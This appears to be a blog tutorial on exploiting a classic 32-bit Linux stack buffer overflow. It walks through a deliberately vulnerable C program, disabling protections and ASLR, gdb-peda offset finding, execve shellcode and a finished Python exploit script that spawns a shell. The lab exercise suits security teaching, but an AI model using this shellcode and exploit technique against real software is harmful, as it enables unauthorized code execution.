---
title: Buffer overflows (Level 1)
date: 2016-11-03
draft: false
tags: [32bit,linux, exploit, bufferoverflow]
---
# What is Smashing the Stack
You may have heard the term buffer overflow or smashing the stack but what does
this mean? Simply this just means that a program hasnt checked its inputs and
important data on the stack has been overwritten (such as a functions return
address). Lets have a quick look at what a functions stack frame may look like
```
3: Arguments
2: local buffer (64 chars)
1: Frame Pointer
0: Return Address
```
So if the program is vulnerable and doesnt do any bounds checking when writing
data into the local buffer then that data can literally overflow the buffer
overwriting the values that come after it (such as the return address).

What this means for an attacker is that we have a way to control the flow of the
programs execution, if we can overflow the buffer then we can overwrite the
return address with an address which points to our malicious code and then when
the function returns our code will get executed.

# Show me the money!
Right below is a vulnerable C program. (follow along by using the vagrant file I
supplied in my post about vagrant)

{{< highlight C >}}
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  char buf[64];
  strcpy(buf, argv[1]);
  puts(buf);
  return 0;
}
{{< / highlight >}}
Lets compile and run
```
  $ gcc -fno-stack-protector -z execstack -o vuln vuln.c
  $ ./vuln AAAA
  AAAA
```
Good all working, notice we have turned off stack protection (stack canaries)
and we have made the stack executable. There is one other protection we want to
disable which is ASLR
```
  $ sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"
```
Now we have a 32bit box circa 2009 ish. lets go break this thing. Fire up the
program in gdb
```
  $ gdb ./vuln
```
First thing we want to do is to find out the size of the buffer that makes the
program crash. Now the good old way was to create patterns with loads of AAAA's
followed by BBBB's etc This was tiresome and tedious so some smart programmer
(longld on github) created [peda](https://github.com/longld/peda) which is a gdb
plugin to help with exploit development.

First we'll create a cyclic pattern and set it to an argument
```
  peda-gdb$ pattern create 100
  'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
  gdb-peda$ pset arg 'cyclic_pattern(100)'
  gdb-peda$ pshow arg 
  arg[1]: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
  gdb-peda$ run
   [----------------------------------registers-----------------------------------]
  EAX: 0x0 
  EBX: 0xb7fd1ff4 --> 0x1a0d7c 
  ECX: 0xffffffff 
  EDX: 0xb7fd38b8 --> 0x0 
  ESI: 0x0 
  EDI: 0x0 
  EBP: 0x65414149 ('IAAe')
  ESP: 0xbffff650 ("AJAAfAA5AAKAAgAA6AAL")
  EIP: 0x41344141 ('AA4A')
  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
  [-------------------------------------code-------------------------------------]
  Invalid $PC address: 0x41344141
  [------------------------------------stack-------------------------------------]
  0000| 0xbffff650 ("AJAAfAA5AAKAAgAA6AAL")
  0004| 0xbffff654 ("fAA5AAKAAgAA6AAL")
  0008| 0xbffff658 ("AAKAAgAA6AAL")
  0012| 0xbffff65c ("AgAA6AAL")
  0016| 0xbffff660 ("6AAL")
  0020| 0xbffff664 --> 0xbffff600 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
  0024| 0xbffff668 --> 0xbffff6f0 --> 0xbffff893 ("LC_PAPER=en_GB.UTF-8")
  0028| 0xbffff66c --> 0x0 
  [------------------------------------------------------------------------------]
  Legend: code, data, rodata, value
  Stopped reason: SIGSEGV
  0x41344141 in ?? ()
  gdb-peda$ 
```
As you can see a buffer of 100 chars crashed the program, lets use peda to find
out what exact offset in the buffer caused the crash
```
  $ gdb-peda$ pattern offset 0x41344141
  1093943617 found at offset: 76
```
Whay choose that hex value? well that was the walue of EIP when the program
crashed. We had overflowed the return address and the program tried to jump to
that address, we simply told peda to seacch for that byte pattern in the cyclic
pattern it had created for us ealier. PEDA told us that there are 76 characters
in the buffer before the return address gets overflowed.

Next step is to get us some shellcode and store it in a variable
```
  gdb-peda$ shellcode generate 
  Available shellcodes:
      x86/bsd bindport
      x86/bsd connect
      x86/bsd exec
      x86/linux bindport
      x86/linux connect
      x86/linux exec

  gdb-peda$ shellcode generate x86/linux exec
  # x86/linux/exec: 24 bytes
  shellcode = (
      "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
      "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
  )
  gdb-peda$ python 
  >shellcode = (
  >    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
  >    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
  >)
  >end
  gdb-peda$ 
```
So it turns out peda also has a library of shellcode as well as an interface to
shelstorm.org. What we have done here is to get peda to display the shellcode
for an execve shell (see my shellcode article). We then use peda's python
command to assign this to a python variable.

Lets craft our payload
```
  gdb-peda$ pset arg '"A" * 76 + "BBBB" + "\x90"*500 + shellcode'
  gdb-peda$ r
   [----------------------------------registers-----------------------------------]
  EAX: 0x0 
  EBX: 0xb7fd1ff4 --> 0x1a0d7c 
  ECX: 0xffffffff 
  EDX: 0xb7fd38b8 --> 0x0 
  ESI: 0x0 
  EDI: 0x0 
  EBP: 0x41414141 ('AAAA')
  ESP: 0xbffff450 --> 0x90909090 
  EIP: 0x42424242 ('BBBB')
  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
  [-------------------------------------code-------------------------------------]
  Invalid $PC address: 0x42424242
  [------------------------------------stack-------------------------------------]
  0000| 0xbffff450 --> 0x90909090 
  0004| 0xbffff454 --> 0x90909090 
  0008| 0xbffff458 --> 0x90909090 
  0012| 0xbffff45c --> 0x90909090 
  0016| 0xbffff460 --> 0x90909090 
  0020| 0xbffff464 --> 0x90909090 
  0024| 0xbffff468 --> 0x90909090 
  0028| 0xbffff46c --> 0x90909090 
  [------------------------------------------------------------------------------]
  Legend: code, data, rodata, value
  Stopped reason: SIGSEGV
  0x42424242 in ?? ()
  gdb-peda$ 
```
As you can see the program crashed again bit this time EIP points to out B's
(0x42424242). Let me explain the payload string. PEDA allow you to use python
expressions to set the argument that will be passed to the program when gdn runs
it so the payload is broken down as follows
* "A" * 76     - 76 A's (which we found using pattern offset)
* "BBBB"       - This will end up being the return address to our shellcode
* "0x90" * 500 - 500 NOPS which gives us a margin of error with the return
                 address
* shellcode    - Our shellcode string we stored in the variable earlier

Right we currently have one thing left to do, find the address to jump to! When
the program crashed peda displayed a nice view of the stack and it seems to be
filled with our NOPS so we'll pick and address near the bottom and insert it
into our payload
```
  gdb-peda$ pset arg '"A" * 76 + "\x6c\xf4\xff\xbf" + "\x90"*500 + shellcode'
  gdb-peda$ r
  AAAAAAAAAAAAAAAA........
  process 8331 is executing new program: /bin/dash
  $ 
```
Hey presto we have a shell! Why is the address backwards? little endian my
friends! go and google it. One point to note is that peda provides a function
for you to do this so you arg could become
```
  gdb-peda$ pset arg '"A" * 76 + int2hexstr(0xbffff46c) + "\x90"*500 + shellcode'
```

# Weaponize it!
Lets use peda to weaponize this thing! PEDA has some nifty commands to write
exploit skeletons
```
  gdb-peda$ skeleton argv exploit.py
  Writing skeleton code to file "exploit.py"
```
This has generated the following code

{{< highlight python >}}
#!/usr/bin/env python
#
# Template for local argv exploit code, generated by PEDA
#
import os
import sys
import struct
import resource
import time

def usage():
    print "Usage: %s target_program" % sys.argv[0]
    return

def pattern(size=1024, start=0):
    try:
        bytes = open("pattern.txt").read(size+start)
        return bytes[start:]
    except:
        return "A"*size

def nops(size=1024):
    return "\x90"*size

def int2hexstr(num, intsize=4):
    if intsize == 8:
        if num < 0:
            result = struct.pack("<q", num)
        else:
            result = struct.pack("<Q", num)
    else:
        if num < 0:
            result = struct.pack("<l", num)
        else:
            result = struct.pack("<L", num)
    return result

i2hs = int2hexstr

def exploit(vuln):
    padding = pattern(0)
    payload = [padding]
    payload += ["PAYLOAD"] # put your payload here
    payload = list2hexstr(payload)
    args = [vuln, payload]
    env = {"PEDA":nops()}
    resource.setrlimit(resource.RLIMIT_STACK, (-1, -1))
    resource.setrlimit(resource.RLIMIT_CORE, (-1, -1))
    os.execve(vuln, args, env)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
    else:
        exploit(sys.argv[1])
{{< / highlight >}}
We have to modify this to include our payload from the gdb session, the output
looks like the following

{{< highlight python >}}
#!/usr/bin/env python
#
# Template for local argv exploit code, generated by PEDA
#
import os
import sys
import struct
import resource
import time

def usage():
    print "Usage: %s target_program" % sys.argv[0]
    return

def pattern(size=1024, start=0):
    try:
        bytes = open("pattern.txt").read(size+start)
        return bytes[start:]
    except:
        return "A"*size

def nops(size=1024):
    return "\x90"*size

def int2hexstr(num, intsize=4):
    if intsize == 8:
        if num < 0:
            result = struct.pack("<q", num)
        else:
            result = struct.pack("<Q", num)
    else:
        if num < 0:
            result = struct.pack("<l", num)
        else:
            result = struct.pack("<L", num)
    return result

i2hs = int2hexstr

def list2hexstr(intlist, intsize=4):
    result = ""
    for value in intlist:
        if isinstance(value, str):
            result += value
        else:
            result += int2hexstr(value, intsize)
    return result

l2hs = list2hexstr

def exploit(vuln):
    padding = "A" * 76
    payload = [padding]
 
    shellcode = (
       "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
       "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
    )

    payload += [int2hexstr(0xbffff46c) +  nops(500) + shellcode] # put your payload here
    payload = list2hexstr(payload)
    args = [vuln, payload]
    env = {"PEDA":nops()}
    resource.setrlimit(resource.RLIMIT_STACK, (-1, -1))
    resource.setrlimit(resource.RLIMIT_CORE, (-1, -1))
    os.execve(vuln, args, env)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
    else:
        exploit(sys.argv[1])
{{< / highlight >}}
Lets run it !!!!
```
  $ ./exploit.py ./vuln
  Illegal instruction (core dumped)
```
Why did this core dump? Well more likely that the address for our shellcode is
now wrong because we were running in gdb before. Luckily it has core dumped and
left a core file around so lets open this up in gdb 
```
  $ gdb ./vuln ./core
  gedb-peda$ stack
  Warning: not running or target is remote
  0000| 0xbffff820 (nop)
  0004| 0xbffff824 (nop)
  0008| 0xbffff828 (nop)
  0012| 0xbffff82c (nop)
  0016| 0xbffff830 (nop)
  0020| 0xbffff834 (nop)
  0024| 0xbffff838 (nop)
  0028| 0xbffff83c (nop)
```
As you can see the address is different we adjust this script to point to
0xbffff83c instead (the parameter to int2hexstr) and lets see how that works out
```
  $ ./exploit.py ./vuln
  AAAAAAAAAAAA.............
  $
```
Nice!! we ended up with a shell (those running bash will have seen their prompt
change

Level 1 complete! Next up what happens when we cant execute code from the
stack!!!!
